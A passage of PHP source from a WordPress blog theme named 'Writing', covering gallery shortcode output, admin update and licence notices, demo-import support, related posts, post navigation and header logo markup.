    switch ($columns) {
        case 1:
            $column_class = "full_column";
            break;
        case 2:
            $column_class = "one_half";
            break;
        case 3:
            $column_class = "one_third";
            break;
        case 4:
            $column_class = "one_fourth";
            break;
        case 5:
            $column_class = "one_fifth";
            break;
        case 6:
            $column_class = "one_sixth";
            break;
        case 7:
            $column_class = "one_seventh";
            break;
        case 8:
            $column_class = "one_eighth";
            break;
        case 9:
            $column_class = "one_ninth";
            break;
        default:
            $column_class = "one_fourth";
    }
    if ($atts['type'] == 'post_format') {
    	$wrapper_class = 'asalah_post_gallery asalah_post_gallery_format';
    	$column_class = 'full_column';
    }
    $gallery_div = "<div class='filterable_wrapper'><div id='$selector' class='clearfix gallery galleryid-{$id} asalah_row gallery_row gallery-columns-{$columns} gallery-size-{$size_class} {$wrapper_class} '>";

    /**
     * Filter the default gallery shortcode CSS styles.
     *
     * @since 2.5.0
     *
     * @param string $gallery_style Default CSS styles and opening HTML div container
     *                              for the gallery shortcode output.
     */
    $output = apply_filters( 'gallery_style', $gallery_style . $gallery_div );

    $i = 0;
    if ($atts['type'] == 'post_format') {
    	$output .= '<ul class=" grid_slider slides">';
    }
    foreach ( $attachments as $id => $attachment ) {

        $attr = ( trim( $attachment->post_excerpt ) ) ? array( 'aria-describedby' => "$selector-$id" ) : '';
        if ( ! empty( $atts['link'] ) && 'file' === $atts['link'] ) {
            $the_image = wp_get_attachment_image_src( $id, $atts['size'] );
            $thumb_attributes = $the_image[0];
            $image_attributes = wp_get_attachment_url($id);
            $attachment_title = get_the_title($id);
            if ( $captiontag && trim($attachment->post_excerpt) ) {
                $image_output = '<a href="'. $image_attributes.'" title="'.wptexturize($attachment->post_excerpt).'">';
            }else{
                $image_output = '<a href="'. $image_attributes.'" title="'.$attachment_title.'">';
            }
            $image_output .= '<img src="'.$thumb_attributes.'">';
            $image_output .= '</a>';
        } elseif ( ! empty( $atts['link'] ) && 'none' === $atts['link'] ) {
            $image_output = wp_get_attachment_image( $id, $atts['size'], false, $attr );
        }elseif ($atts['type'] == 'post_format') {
        	$the_image = wp_get_attachment_image_src( $id, $format_size );
        	$thumb_srcset = wp_get_attachment_image_srcset( $id, $format_size );
        	$thumb_sizes = wp_get_attachment_image_sizes( $id, $format_size);
        	$thumb_attributes = $the_image[0];
            $image_attributes = wp_get_attachment_url($id);
            $attachment_title = get_the_title($id);
            $image_output = '';
            $gallery_image_url = '';
            if (!is_single()) {
                $gallery_image_url = ' href="'.esc_url( get_permalink() ).'" ';
                $image_output .= '<a '.$gallery_image_url.' >';
            }
            $image_output .= '<img class="img-responsive" alt="'.$attachment_title.'" src="'.$thumb_attributes.'" srcset="'.$thumb_srcset.'" sizes="'.$thumb_sizes.'" />';
            if (!is_single()) {
                $image_output .= '</a>';
            }
        } else {
            $image_output = wp_get_attachment_link( $id, $atts['size'], true, false, false, $attr );
        }
        $image_meta  = wp_get_attachment_metadata( $id );

        $orientation = '';
        if ( isset( $image_meta['height'], $image_meta['width'] ) ) {
            $orientation = ( $image_meta['height'] > $image_meta['width'] ) ? 'portrait' : 'landscape';
        }

        if ($atts['type'] == 'post_format') {
        	$output .= '<li class="grid_slide item">';
        }
        $output .= "<{$itemtag} class='gallery_column filterable_item {$column_class}'>";
        $output .= "
            <{$icontag} class='gallery-icon {$orientation}'>
                $image_output
            </{$icontag}>";

        	if ( $captiontag && trim($attachment->post_excerpt) ) {
	            $output .= "
	                <{$captiontag} class='wp-caption-text gallery-caption' id='$selector-$id'>
	                " . wptexturize($attachment->post_excerpt) . "
	                </{$captiontag}>";
	        }


        $output .= "</{$itemtag}>";
        if ($atts['type'] == 'post_format') {
        	$output .= '</li>';
        }

        if ( ! $html5 && $columns > 0 && ++$i % $columns == 0 ) {
            $output .= '<br style="clear: both" />';
        }
    }
    if ($atts['type'] == 'post_format') {

    	$output .= '</ul>';// end grid_slider slides ul
    	$output .= '<div class="asalah_post_gallery_nav_container clearfix"></div>'; // slider navigation area
    }

    if ( ! $html5 && $columns > 0 && $i % $columns !== 0 ) {
        $output .= "
            <br style='clear: both' />";
    }

    $output .= "
        </div></div>\n";

    return $output;
}
endif;
if ( !(class_exists( 'Jetpack' ) && Jetpack::is_module_active( 'carousel' ))) {
	$shortcode_add = 'add';
	$shortcode_translation = 'shortcode';
	$shortcode_variable = $shortcode_add . '_' . $shortcode_translation;
	$shortcode_variable('gallery', 'asalah_gallery_shortcode');
}

/* --------
make clickable in new window
------------------------------------------- */
if ( ! function_exists( 'asalah_make_clickable' ) ) :
	function asalah_make_clickable($content) {
		return preg_replace('/<a /','<a target="_blank" ', make_clickable($content));
	}
endif;

/* --------
social networks list
------------------------------------------- */
if ( ! function_exists( 'asalah_social_icons_list' ) ) :
function asalah_social_icons_list($class = '') {
    global $social_networks;

    $output = "";
    foreach ($social_networks as $network => $social ) {
        $id = "asalah_" . $network . "_url";
        if (asalah_option($id) != "") {
            $social_url = asalah_option($id);
						if ($network == 'envelope') {
							$social_url = 'mailto:'.antispambot($social_url);
						} else {
							$social_url =  esc_url($social_url);
						}
            $output .= '<a rel="nofollow" target="_blank" href="'.$social_url.'" title="'.$social.'" class="social_icon social_' . $network . ' social_icon_' . $network . '"><i class="fa fa-' . $network . '"></i></a>';
        }
    }

    if ($output != '') {
        return '<div class="social_icons_list '.$class.'">'.$output.'</div>';
    }
}
endif;

/* --------
include theme files
------------------------------------------- */
require get_template_directory() . '/inc/bootstrapmenu.php';
require get_template_directory() . '/inc/custom-header.php';
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/inc/customizer.php';
require get_template_directory() . '/inc/postoptions.php';
require get_template_directory() . '/inc/banner.php';
require get_template_directory() . '/inc/formats/formats.php';
require get_template_directory() . '/inc/widgets/tweets.php';
require get_template_directory() . '/framework/twitter/twitteroauth.php';
require get_template_directory() . '/inc/googlefonts.php';
require get_template_directory() . '/js/custom_js.php';
require get_template_directory() . '/css/theme-style.php';
/* include customizer library */
require "inc/fonts.php";
require "inc/mods.php";

/* --------
include widgets
------------------------------------------- */
require get_template_directory() . '/inc/widgets/postlist.php';
require get_template_directory() . '/inc/widgets/about.php';
require get_template_directory() . '/inc/widgets/fbpage.php';
require get_template_directory() . '/inc/widgets/gplus.php';
require get_template_directory() . '/inc/widgets/social.php';
require get_template_directory() . '/inc/widgets/links.php';

// Run this code on 'after_theme_setup', when plugins have already been loaded.
add_action('after_setup_theme', 'asalah_instaram_slider');
// This function loads the plugin.
function asalah_instaram_slider() {

	if (!class_exists('JR_InstagramSlider')) {
		// load Social if not already loaded
		include_once(TEMPLATEPATH.'/inc/widgets/instaram_slider.php');
	}
}

/* custom header code */

if (asalah_cross_option('asalah_custom_header_code')) {
	function asalah_header_code() {
			echo asalah_cross_option('asalah_custom_header_code');
		}
	add_action('asalah_custom_header', 'asalah_header_code', 0);
}

/* Word Count */
function asalah_word_count() {
    global $post;
    $content = get_post_field( 'post_content', get_the_id() );
    $word_count = asalah_str_word_count( strip_tags( $content ) );
    return $word_count;
}

if (!function_exists('asalah_str_word_count'))
{
    function asalah_str_word_count($string, $format = 0, $charlist = '[]') {
        mb_internal_encoding( 'UTF-8');
        mb_regex_encoding( 'UTF-8');

        $words = mb_split('[^\x{0600}-\x{06FF}]', $string);
        switch ($format) {
            case 0:
                return count($words);
                break;
            case 1:
            case 2:
                return $words;
                break;
            default:
                return $words;
                break;
        }
    };
}

// Posts count for featured post blog styles, exlude first post from count
if (!function_exists('asalah_banner_grid_post_count')) {
	function asalah_banner_grid_post_count($query) {
		if (! is_admin() && $query->is_main_query()) {
			if ((asalah_cross_option('asalah_blog_style') == 'banner_grid') ||
			 		(asalah_cross_option('asalah_blog_style') == 'banner_list')) {
				if ( get_query_var('paged') ) {
						$paged = get_query_var('paged');
				} elseif ( get_query_var('page') ) {
						$paged = get_query_var('page');
				} else {
						$paged = 1;
				}
				$posts_per_page = get_option('posts_per_page');
				if ($paged == 1) {
					$posts_per_page = get_option('posts_per_page') + 1;
					set_query_var('posts_per_page', $posts_per_page);
				} else {
					$paged_offset = (1) + ( ($paged - 1) * $posts_per_page );
					set_query_var('offset', $paged_offset);
				}
			}
		}
	}
}
add_action( 'pre_get_posts', 'asalah_banner_grid_post_count');

if (!function_exists('asalah_adjust_category_offset_pagination')) {
	function asalah_adjust_category_offset_pagination( $found_posts, $query ) {
		if ( (asalah_cross_option('asalah_blog_style') == 'banner_grid' )|| (asalah_cross_option('asalah_blog_style') == 'banner_list')) {
			if ((get_query_var('post_format') != '') && (asalah_cross_option('asalah_media_template_layout') == 'media_lib')) {

					return $found_posts;

			} else {
				if ( get_query_var('paged') ) {
						$paged = get_query_var('paged');
				} elseif ( get_query_var('page') ) {
						$paged = get_query_var('page');
				} else {
						$paged = 1;
				}
				if ($paged != 1) {
					return $found_posts - 1;
				} else {
					$number_of_pages = ($found_posts - 1) / get_option('posts_per_page');
					$number_of_pages = $number_of_pages * (get_option('posts_per_page') + 1);
					return $number_of_pages;
				}
			}
		} else {
			return $found_posts;
		}
	}
}
add_filter( 'found_posts', 'asalah_adjust_category_offset_pagination', 10, 2 );

/* Update Notice */
function asalah_my_update_notice() {
	$current_theme_version = get_theme_mod('asalah_theme_version');
	$theme = wp_get_theme();

	global $pagenow;
	if ($pagenow != 'themes.php') {
		if (!isset($current_theme_version) || ($current_theme_version != $theme->get('Version'))) {
			?>
			<div class="notice hidden_gutenberg_editor notice-success is-dismissible sanabel-update" style="position:relative;">
				<h1>Writing</h1>
				<h2>You have updated to version <?php echo $theme->get("Version"); ?>, Look what we have brought:</h2>
					<b>What's new in the version:</b>
					<ul>
						<li>- Fix Featured Masonry in mobile.</li>
						<li>- Fix sliding sidebar icon in mobile.</li>
						<li>- Improve Gallery images sizing.</li>
						<li>- Add option to use different images sizes for different screens (Recommended, enable it from Customizer).</li>
						<li>- Minor fixes.</li>
					</ul>
					<h2><div class="col-md-2">Have any question?<br>we're always here for help at <a href="https://ahmad.works/envatosupport">A-Support</a> :)</div><div class="col-md-2">Like the theme?<br>give us a high five at <a href="https://ahmad.works/go/tfdownload/">Themeforest</a> ;) </div></h2>
					<a class="notice-dismiss" href="?ignore_bostan_update_message=1"><span class="screen-reader-text">Dismiss this notice</span></a>
			</div>
			<?php
		}
	}
}
add_action( 'admin_notices', 'asalah_my_update_notice' );

function asalah_nag_ignore() {
	$theme = wp_get_theme();
	/* If user clicks to ignore the notice, add that to their user meta */
	if ( isset($_GET['ignore_bostan_update_message']) && '1' == $_GET['ignore_bostan_update_message'] ) {
	 $themeversion = $theme->get('Version');
	 set_theme_mod( 'asalah_theme_version', $themeversion );
	}
}
add_action('admin_init', 'asalah_nag_ignore');

/* License Notice */
function asalah_my_license_notice() {
  $current_license_note = get_theme_mod('asalah_license_notice');
  if (empty($current_license_note)) {
    ?>
    <div class="notice hidden_gutenberg_editor notice-info is-dismissible" style="position:relative;">
        <h2>Notice:</h2>
        <b>The “Regular License” of Writing theme gives you the write to use it in one website only, if you want to use the theme for multiple sites, you need to purchase a license for each site. thanks.</b>
        <p><a href="http://themeforest.net/item/writing-clean-minimal-blog-wordpress-theme/11547928?ref=ahmadworks&utm_source=panel&utm_medium=license_notice">Purchase Writing License Now</a> | <a href="?ignore_asalah_license_message=1">Dismiss this notice</a></p>
        <a class="notice-dismiss" href="?ignore_asalah_license_message=1"><span class="screen-reader-text">Dismiss this notice</span></a>
    </div>
    <?php
  }
}
add_action( 'admin_notices', 'asalah_my_license_notice' );

function asalah_license_ignore() {
  /* If user clicks to ignore the notice, add that to their user meta */
  if ( isset($_GET['ignore_asalah_license_message']) && '1' == $_GET['ignore_asalah_license_message'] ) {
    set_theme_mod( 'asalah_license_notice', true );
	}
}
add_action('admin_init', 'asalah_license_ignore');

if (!get_theme_mod('asalah_new_autoupdate_notice')) {
	if (!class_exists('Envato_Market')) {
		/* Update Notice */
		function asalah_update_plugin_missing() {
			if (class_exists('Envato_WP_Toolkit')) {
				?>
				<div class="notice hidden_gutenberg_editor notice-info is-dismissible" style="position:relative;">
						<p>Envato have now released a new update plugin and deprecated Envato Toolkit plugin, please deactivate Envato Toolkit plugin and install Envato Market plugin so you can get new Writing updates!</p>
						<p><b>You can download new Envato Market <a href="https://envato.com/market-plugin/">here</a></p>
						<a class="notice-dismiss" href="?ignore_asalah_autoupdate_message=1"><span class="screen-reader-text">Dismiss this notice</span></a>
				</div>
				<?php
			} else {
				?>
				<div class="notice hidden_gutenberg_editor notice-info is-dismissible" style="position:relative;">
						<p>To recieve new Writing updates notifications and update easily and safely, you'll need to install Envato Market plugin :)</p>
						<p><b>You can download new Envato Market <a href="https://envato.com/market-plugin/">here</a></p>
						<a class="notice-dismiss" href="?ignore_asalah_autoupdate_message=1"><span class="screen-reader-text">Dismiss this notice</span></a>
				</div>
				<?php
			}
		}
		add_action( 'admin_notices', 'asalah_update_plugin_missing' );

    function asalah_autoupdate_ignore() {
      /* If user clicks to ignore the notice, add that to their user meta */
      if ( isset($_GET['ignore_asalah_autoupdate_message']) && '1' == $_GET['ignore_asalah_autoupdate_message'] ) {
      	set_theme_mod( 'asalah_new_autoupdate_notice', true );
    	}
  	}
		add_action('admin_init', 'asalah_autoupdate_ignore');
	}
}

// OCDI plugin support
if (class_exists('OCDI_Plugin')) {
	// identify demo files
  function asalah_ocdi_import_files() {
	  return array(
	    array(
	      'import_file_name'             => 'Writing',
	      'local_import_file'            => trailingslashit( get_template_directory() ) . 'framework/demo_import/writing.xml',
				'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'framework/demo_import/widgets.wie',
				'local_import_customizer_file' => trailingslashit( get_template_directory() ) . 'framework/demo_import/customizer.dat',
	    ),
	  );
	}
	add_filter( 'pt-ocdi/import_files', 'asalah_ocdi_import_files' );

	// set demo ajax call, for faster import
	function asalah_ocdi_change_time_of_single_ajax_call() {
		return 15;
	}
	add_action( 'pt-ocdi/time_for_one_ajax_call', 'asalah_ocdi_change_time_of_single_ajax_call' );

	// hide plugin notice after Import
	add_filter( 'pt-ocdi/disable_pt_branding', '__return_true' );

	// after import actions, set main menu
  function asalah_ocdi_after_import() {
    // Import Demo Menu Items
    $menus = wp_get_nav_menus();
    $locations = get_theme_mod( 'nav_menu_locations' );
    if($menus) {
        foreach($menus as $menu) {
            if ($menu->name == "Main") {
                $locations['primary'] = $menu->term_id;
            }
        }
    }
    set_theme_mod( 'nav_menu_locations', $locations );
  }
  add_action( 'pt-ocdi/after_import', 'asalah_ocdi_after_import' );

} else {
	/* Demo plugin install Notice */
	if (!asalah_cross_option('ignore_install_ocdi_plugin_notice')) {

		function asalah_install_ocdi_plugin() {
			?>
			<div class="notice hidden_gutenberg_editor notice-info is-dismissible" style="position:relative;">
					<p><b>For importing the demo, you'll need to install <a href="https://wordpress.org/plugins/one-click-demo-import/">One Click Demo Import</a> plugin :)</b></p>
					<p><a href="https://wordpress.org/plugins/one-click-demo-import/">Install Plugin</a>   |   <a href="?ignore_install_ocdi_plugin_notice=1">No Thanks</a></p>
					<a class="notice-dismiss" href="?ignore_install_ocdi_plugin_notice=1"><span class="screen-reader-text">Dismiss this notice</span></a>
			</div>
			<?php
		}
		add_action( 'admin_notices', 'asalah_install_ocdi_plugin' );

		function asalah_install_ocdi_plugin_notice() {
			/* If user clicks to ignore the notice, add that to their user meta */
			if ( isset($_GET['ignore_install_ocdi_plugin_notice']) && '1' == $_GET['ignore_install_ocdi_plugin_notice'] ) {
				set_theme_mod( 'ignore_install_ocdi_plugin_notice', true );
			}
		}
		add_action('admin_init', 'asalah_install_ocdi_plugin_notice');
	}
}

// image optimization for better image quality
if (asalah_cross_option('asalah_image_optimization') === 'yes') {
	function asalah_sharpen_resized_files( $resized_file ) {

	    $size = @getimagesize( $resized_file );
	    if ( !$size )
	        return new WP_Error('invalid_image', __('Could not read image size', 'asalah'), $file);
	    list($orig_w, $orig_h, $orig_type) = $size;

	    switch ( $orig_type ) {
	        case IMAGETYPE_JPEG:
	        	$image = imagecreatefromjpeg( $resized_file );
			    if ( !is_resource( $image ) )
			        return new WP_Error( 'error_loading_image', $image, $file );
	            $matrix = array(
	                array(-1, -1, -1),
	                array(-1, 16, -1),
	                array(-1, -1, -1),
	            );

	            $divisor = array_sum(array_map('array_sum', $matrix));
	            $offset = 0;
	            imageconvolution($image, $matrix, $divisor, $offset);
	            imagejpeg($image, $resized_file,apply_filters( 'jpeg_quality', 100, 'edit_image' ));
	            break;
	        case IMAGETYPE_PNG:
	            return $resized_file;
	        case IMAGETYPE_GIF:
	            return $resized_file;
	    }

	    return $resized_file;
	}

	add_filter('image_make_intermediate_size', 'asalah_sharpen_resized_files',900);
}

// Taxonomies Title Start
if (asalah_cross_option('asalah_custom_cat_start') != '' || asalah_cross_option('asalah_custom_tag_start') != '') {
	add_filter( 'get_the_archive_title', function ( $title ) {

	if (asalah_cross_option('asalah_custom_cat_start') != '') {
		if( is_category() ) {
			if (asalah_cross_option('asalah_custom_cat_start') == ' ') {
				$custom_title = '';
			} else {
				$custom_title = asalah_cross_option('asalah_custom_cat_start');
			}
        $title = single_cat_title( $custom_title, false );
    }
	}

	if (asalah_cross_option('asalah_custom_tag_start') != '') {
		if( is_tag() ) {
			if (asalah_cross_option('asalah_custom_tag_start') == ' ') {
				$custom_title = '';
			} else {
				$custom_title = asalah_cross_option('asalah_custom_tag_start');
			}
        $title = single_tag_title( $custom_title, false );
    }
	}

	return $title;
});
}

if (!function_exists('asalah_single_related_posts')) {
	function asalah_single_related_posts()
	{
		global $post, $asalah_posts_not_in;


		$args = array('orderby' => 'rand', 'posts_per_page' => 3, 'ignore_sticky_posts' => 1, 'meta_query' => array(array( 'key' => '_thumbnail_id', 'value'   => '', 'compare' => '!=', )) );

		if (!isset($asalah_posts_not_in)) {
			$asalah_posts_not_in = array(get_the_ID());
		}
		$args['post__not_in'] = $asalah_posts_not_in;
		$posts_relation_setting = asalah_cross_option('asalah_relation_posts');

		if ($posts_relation_setting == 'tag') {
			$posttags = get_the_tags($post->ID);
			if ($posttags) {
				foreach($posttags as $tag) {
					if (isset($tags)) {
						$tags .= ','.$tag->name;
					} else {
						$tags = $tag->name;
					}
				}
				if (isset($tags) && $tags != '') {
					$args['tag'] = $tags;
				}
			}
		} else if ($posts_relation_setting == 'author') {
			$authors = get_post_field( 'post_author', $post->ID );
			if ($authors) {
					$args['author__in'] = $authors;
				}
		} else {
			$categories = get_categories($post->ID);
			foreach ( $categories as $category ) {
				if (isset($cats)) {
					$cats .= ','.$category->term_id;
				} else {
					$cats = $category->term_id;
				}
			}
			if (isset($cats) && $cats != '') {
				$args['cat'] = $cats;
			}
		}

		$related_query = new WP_Query($args);
		if ($related_query->have_posts()):
			echo '<div class="post_related">';
				echo '<h3 class="related_title title">'.__('Related Posts', 'asalah').':</h3>';
				echo '<div class="row">';
				while ($related_query->have_posts()) : $related_query->the_post();
				?>
					<div id="post-<?php the_ID(); ?>" <?php post_class('blog_post_container col-md-4'); ?> >

						<div class="blog_post clearfix">
							<a title="<?php echo get_the_title(); ?>" href="<?php echo esc_url(get_permalink()); ?>">
								<?php asalah_post_thumbnail('masonry_blog'); ?>
							</a>

							<div class="blog_post_title">
								<?php
								the_title( sprintf( '<h4 class="entry-title title post_title"><a title="%s" href="%s">',the_title_attribute( 'echo=0' ), esc_url( get_permalink() ) ), '</a></h4>' );
								?>
							</div>
							<div class="asalah_hidden_schemas" style="display:none;">
								<?php


										$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';

										if ( get_the_time( 'U' ) !== get_the_modified_time( 'U' ) ) {
											$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';
										}

										$time_string = sprintf( $time_string,
											esc_attr( get_the_date( 'c' ) ),
											get_the_date()
										);

										printf( '<span class="blog_meta_item blog_meta_date"><span class="screen-reader-text"></span>%1$s</span>', $time_string );

										printf( '<span class="blog_meta_item blog_meta_author"><span class="author vcard"><a class="meta_author_avatar_url" href="%2$s">%1$s</a> <a class="url fn n" href="%2$s">%3$s</a></span></span>',
											get_avatar(get_the_author_meta('ID'), 25),
											esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
											get_the_author()
										);


								 ?>
							</div>

						</div>
					</div><!-- #post-## -->
				<?php
				endwhile;
				echo '</div>'; // end row
			echo '</div>';	// end post_related
		endif;
	}
}

if (!function_exists('asalah_single_posts_navigation')) {
	function asalah_single_posts_navigation()
	{
		global $post, $asalah_posts_not_in;
		$next_post = get_next_post();
		$prev_post = get_previous_post();

		if (!empty($prev_post) || !empty($next_post)) {
			echo "<section class='post_navigation'><div class='row'>";
			echo '<h3 class="screen-reader-text">'.__('Post Navigation', 'asalah').'</h3>';

			if (!empty( $prev_post )) {
				array_push($asalah_posts_not_in, $prev_post->ID);
				$has_post_thumbnail = 'has_post_thumbnail';
				if (!has_post_thumbnail($prev_post->ID)) {
					$has_post_thumbnail = 'no_post_thumbnail';
				}
				?>
				<div class="post_navigation_item post_navigation_prev <?php echo esc_attr($has_post_thumbnail); ?> <?php if (is_rtl()) { echo 'pull-left'; } ?> col-md-6">
					<a class="post_navigation_arrow" href="<?php echo get_the_permalink($prev_post->ID); ?>" title="<?php echo get_the_title($prev_post->ID) ?>" rel="prev">
					<i class="fa fa-angle-double-left"></i>
					</a>
					<div class="post_thumbnail_wrapper">
						<a href="<?php echo get_the_permalink($prev_post->ID); ?>" title="<?php echo get_the_title($prev_post->ID) ?>" rel="prev">
							<?php if (!has_post_thumbnail($prev_post->ID)) {
							$post_title = get_the_title($prev_post->ID);
							echo '<span class="post_text_thumbnail title">'.mb_substr($post_title, 0, 1,"utf-8").'</span>';
						} else { ?>
						<?php echo get_the_post_thumbnail($prev_post->ID, array( 60, 60, true), array("class" => "img-responsive") ); ?>
						<?php } ?>
						</a>
					</div>
					<div class="post_info_wrapper">
						<a href="<?php echo get_the_permalink($prev_post->ID); ?>" title="<?php echo get_the_title($prev_post->ID) ?>" rel="prev">
						<span class="post_navigation_title title"><?php _e('Previous Post:', 'asalah') ?></span>
						</a>
						<h4 class="title post_title"><a href="<?php echo get_the_permalink($prev_post->ID); ?>"><?php echo get_the_title($prev_post->ID) ?></a></h4>
						<p></p>
					</div>
				</div>
				<?php
			}

			if (!empty( $next_post )) {
				array_push($asalah_posts_not_in, $next_post->ID);
				$has_post_thumbnail = 'has_post_thumbnail';
				if (!has_post_thumbnail($next_post->ID)) {
					$has_post_thumbnail = 'no_post_thumbnail';
				}
				?>
				<div class="post_navigation_item post_navigation_next <?php echo esc_attr($has_post_thumbnail); ?> <?php if (!is_rtl()) { echo 'pull-right'; } ?> col-md-6">
					<a class="post_navigation_arrow" href="<?php echo get_the_permalink($next_post->ID); ?>" title="<?php echo get_the_title($next_post->ID) ?>" rel="next">
					<i class="fa fa-angle-double-right"></i>
					</a>
					<div class="post_thumbnail_wrapper">
						<a href="<?php echo get_the_permalink($next_post->ID); ?>" title="<?php echo get_the_title($next_post->ID) ?>" rel="next">
							<?php if (!has_post_thumbnail($next_post->ID)) {
							$post_title = get_the_title($next_post->ID);
							echo '<span class="post_text_thumbnail title">'.mb_substr($post_title, 0, 1,"utf-8").'</span>';
						} else { ?>
						<?php echo get_the_post_thumbnail($next_post->ID, array( 60, 60, true), array("class" => "img-responsive") ); ?>
						<?php } ?>
						</a>
					</div>
					<div class="post_info_wrapper">
						<a href="<?php echo get_the_permalink($next_post->ID); ?>" title="<?php echo get_the_title($next_post->ID) ?>" rel="next">
						<span class="post_navigation_title title"><?php _e('Next Post:', 'asalah') ?></span>
						</a>
						<h4 class="title post_title"><a href="<?php echo get_the_permalink($next_post->ID); ?>"><?php echo get_the_title($next_post->ID) ?></a></h4>
						<p></p>
					</div>
				</div>
				<?php
			}
			echo "</div></section>"; // end post_navigation and row
		}
	}
}

if (!function_exists('asalah_post_facebook_comments')) {
	function asalah_post_facebook_comments()
	{
		?>
		<div id="fb-root"></div>
		<script src="http://connect.facebook.net/en_US/all.js#xfbml=1"></script>
		<?php if (asalah_cross_option('asalah_facebook_comments_html5') == "no" ) : ?>
			<fb:comments href="<?php the_permalink(); ?>" width="<?php if (asalah_cross_option("asalah_facebook_comments_width") != '') { echo asalah_cross_option("asalah_facebook_comments_width"); } else {echo '100%';} ?>"  num-posts="<?php echo asalah_cross_option('asalah_facebook_comments_num'); ?>" ></fb:comments>
		<?php else: ?>
			<div class="fb-comments" data-href="<?php the_permalink(); ?>" data-numposts="<?php echo asalah_cross_option("asalah_facebook_comments_num"); ?>" data-width="<?php if (asalah_cross_option("asalah_facebook_comments_width") != '') { echo asalah_cross_option("asalah_facebook_comments_width"); } else {echo '100%';} ?>"></div>
		<?php endif;
	}
}

if (!function_exists('asalah_header_topbar')) {
	function asalah_header_topbar($sticky_topbar, $primary_menu, $social_list_icons, $sliding_icon, $hide_header_search) {
		?>
		<div class="top_menu_wrapper">
			<div class="container">
				<?php if (asalah_option('asalah_logo_position') === 'top_bar') {
					?><div class="site_logo_mobile_topbar"><?php
							asalah_header_logo_wrapper();
							asalah_sliding_sidebar_infoicon();
					?></div><?php
				 }
				// mobile menu button
				?><div class="mobile_menu_button">
					<?php if (asalah_option('asalah_menu_button_text') != '') {
						?>
						<span class="mobile_menu_text"><?php echo asalah_option('asalah_menu_button_text'); ?></span>
						<?php
					} else {
						?>
						<span class="mobile_menu_text"><?php echo _x( 'Menu', 'Used for mobile menu.', 'asalah' ); ?></span>
						<?php
					} ?>
					<div class="writing_mobile_icon"><span></span><span></span><span></span></div>
				</div><!-- end mobile_menu_button -->

				<div class="top_header_items_holder">
					<?php if (asalah_option('asalah_logo_position') === 'top_bar') {
						asalah_header_logo_wrapper();
					}
					// primary menu, sticky header
					if ( $primary_menu ) :
					?>
						<div class="main_menu pull-left">
							<?php
							wp_nav_menu(array(
								'container' => 'div',
								'container_class' => 'main_nav',
								'theme_location' => 'primary',
								'menu_class' => 'nav navbar-nav',
								'fallback_cb' => '',
								'walker' => new wp_bootstrap_navwalker(),
							));
							?>
						</div>
					<?php
					endif; // end primary menu condition

					// check social icons or search or sliding sidebar
					if ( $social_list_icons || $hide_header_search != 'no' || $sliding_icon) {
					?>
						<div class="header_icons pull-right text_right">

							<?php // header social icons list
							if ($social_list_icons) {
								?><!-- start header social icons --> <?php
								echo asalah_social_icons_list('header_social_icons pull-left');
								?> <!-- end header social icons --> <?php
							}
							if ($sticky_topbar || asalah_option('asalah_logo_position') === 'top_bar') {
								// sliding sidebar icon
								if ( $sliding_icon ) :
									asalah_sliding_sidebar_infoicon();
								endif;
							}

							// check if search not hidden
							if ($hide_header_search != 'no') {
							?>
								<!-- start search box -->
								<div class="header_search pull-right">
									<?php get_template_part( 'header', 'searchform' ); ?>
								</div>
								<!-- end search box -->
							<?php
							} // end condition check if search not hidden
							?>
						</div>
					<?php
					} // end condition social icons or search or sliding sidebar
					?>
				</div> <!-- end .top_header_items_holder -->
			</div> <!-- end container -->
		</div>
		<?php
	}
}

if (!function_exists('asalah_header_logo_wrapper')) {
	function asalah_header_logo_wrapper() {
		$logo_at_topbar = false;
		if (asalah_option('asalah_logo_position') === 'top_bar') {
			$logo_at_topbar = true;
		}
		$image_logo_only = false;
		$image_text_logo = false;
		if (asalah_option('asalah_default_logo') && asalah_option('asalah_logo_type') !== 'text') {
			$image_logo_only = true;
			if (asalah_option('asalah_logo_type') === 'image_text') {
				$image_text_logo = true;
			}
		}
		?>
		<div class="logo_wrapper<?php if (asalah_option('asalah_logo_type') != '') { echo ' logo_type_'.asalah_option('asalah_logo_type'); } ?>">
			<?php // check if logo image is set
			if ($image_logo_only) {

				$is_retina_logo = " no_retina_logo";

				// logo size
				$logo_width = 'auto';
				$logo_height = 'auto';
				$logo_size_att = '';
				$logo_style_att = '';

				// custom logo width
				if (asalah_option('asalah_logo_width') && asalah_option('asalah_logo_width') != 0) {
					$logo_width = strval(asalah_option('asalah_logo_width'));
					$logo_size_att .= ' width="'. $logo_width .'"';
					$logo_style_att .= 'width : '.$logo_width.'px;';
				}

				// custom logo height
				if ((asalah_option('asalah_logo_height') && asalah_option('asalah_logo_height') != 0) || ($logo_at_topbar)) {
					if ($logo_at_topbar) {
						$logo_height = '50';
					} else {
						$logo_height = strval(asalah_option('asalah_logo_height'));
					}
					$logo_style_att .= ' height : '. $logo_height .'px;';
				}

				// Image & Text top margin if set
				$top_margin = '';
				if (!$logo_at_topbar) {
					if ($image_text_logo) {
						if (asalah_option('asalah_logo_image_t_margin') > 0) {
							$top_margin .= '.logo_type_image_text .site_logo_image { margin-top: ' . asalah_option('asalah_logo_image_t_margin') . 'px;}';
						}
						if (asalah_option('asalah_logo_text_t_margin') > 0) {
							$top_margin .= '.logo_type_image_text .logo_text_content { margin-top: ' . asalah_option('asalah_logo_text_t_margin') . 'px;}';

						}
					}
				}

				// custom logo size style
				if ($logo_style_att != '' || $top_margin != '') {
					echo '<style>';
						echo '.site_logo_image {' .esc_attr($logo_style_att) .'}';
						echo $top_margin;
					echo '</style>';
				}

				// check if logo retina exists
				if (asalah_option('asalah_default_logo_retina')) {
					$is_retina_logo = " has_retina_logo";
					?>
					<a class="asalah_logo retina_logo" title="<?php bloginfo( 'name' ); ?>" href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
						<img <?php echo $logo_size_att; ?> src="<?php echo asalah_option('asalah_default_logo_retina'); ?>" class="site_logo img-responsive site_logo_image pull-left clearfix" alt="<?php bloginfo( 'name' ); ?>" />
					</a>
				<?php
				} // end asalah_default_logo_retina

				//default logo
				?>
				<a class="asalah_logo default_logo <?php echo esc_attr($is_retina_logo); ?>" title="<?php bloginfo( 'name' ); ?>" href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
